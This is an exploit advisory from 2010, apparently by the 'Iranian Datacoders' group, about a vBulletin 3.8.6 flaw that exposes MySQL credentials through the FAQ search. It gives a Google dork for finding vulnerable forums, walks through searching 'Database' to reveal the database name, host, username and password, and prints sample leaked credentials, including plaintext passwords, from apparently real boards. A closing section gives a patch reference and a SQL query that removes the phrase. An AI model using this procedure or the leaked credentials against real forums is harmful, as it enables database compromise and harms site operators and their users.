@@ -1,0 +1,90 @@
+   010101010101010101010101010101010101010101010101010101010    
+   0                                                       0
+   1  Iranian Datacoders Security Team 2010
+   0                                                       0
+   010101010101010101010101010101010101010101010101010101010
+
+# Original Advisory: http://forum.intern0t.net/exploits-vulnerabilities-pocs/2857-vbulletin-3-8-6-critical-information-disclosure.html
+# Reference: http://www.securityfocus.com/archive/1/512575/30/0/threaded
+
+# Exploit Title: vBulletin 3.8.6 faq.php Vulnerability                   
+# Date: 24/07/2010                             
+# Author: H-SK33PY                      
+# Software Link: http://www.vbulletin.com/
+# Version: 3.8.6
+# Google dork : powered by vBulletin 3.8.6
+# Platform / Tested on: linux
+# Category: webapplications
+# Code : N/A
+
+#BUG:#########################################################################
+
+Is perhaps one or the other known, but I find that really interesting that a great and mighty forum software like vBulletin can undermine the mistake that the MySQL password for any person to be visible.
+
+The issue has been published this afternoon and vBulletin responded with a patch on it.
+
+The faq.php was only indirectly affected, and serves more as an "issue" because an error was partly responsible for the phrases.
+
+Where are the gaps?
+
+Let's look at the /install/vbulletin-language.xml file and search for "database_ingo" - what we find? Ah interesting:
+
+##################################################################################################
+<phrase name="database_ingo" date="1271086009" username="Jelsoft" version="3.8.5"><![CDATA[Database Name: {$vbulletin->config['Database']['dbname']}<br />
+Database Host: {$vbulletin->config['MasterServer']['servername']}<br />
+Database Port: {$vbulletin->config['MasterServer']['port']}<br />
+Database Username: {$vbulletin->config['MasterServer']['username']}<br />
+Database Password: {$vbulletin->config['MasterServer']['password']}]]></phrase>
+##################################################################################################
+
+How do I use this from now?
+We look for a forum, which is affected by this vulnerability, click above on "Help" / "FAQ", enter in "search terms" or "Search Word (s):" then "Database"
+(or database) and a then see, aha, first hit:
+
+##################################################################################################
+
+Datenbank-Name: XXXXXXXXX
+
+Datenbank-Server: localhost
+
+Datenbank-Port: 3306
+
+Datenbank-Benutzername: root
+
+Datenbank-Kennwort: my4moo
+##################################################################################################
+
+
+Respectively English beeen at a board:
+
+##################################################################################################
+Database Name: pro_aXXXXXXXXXg_com
+
+Database Host: localhost
+
+Database Port: 3306
+
+Database Username: pro_aXXXXXXXXXg
+
+Database Password: gitl0st
+##################################################################################################
+
+On what to do with it, I think I need not dwell on it.
+
+How do I protect myself?
+As already posted a patch from the official vBulletin site, or by a MySQL query:
+
+##################################################################################################
+DELETE FROM `vb_phrase` WHERE `varname`='database_ingo' 
+
+
+##################################################################################################
+##################################################################################################
+##################################################################################################
+
+#############################################################################
+Our Website : http://www.datacoders.ir
+
+Special Thanks to : ccC0d3rZzz &  all iranian datacoders members
+
+#############################################################################
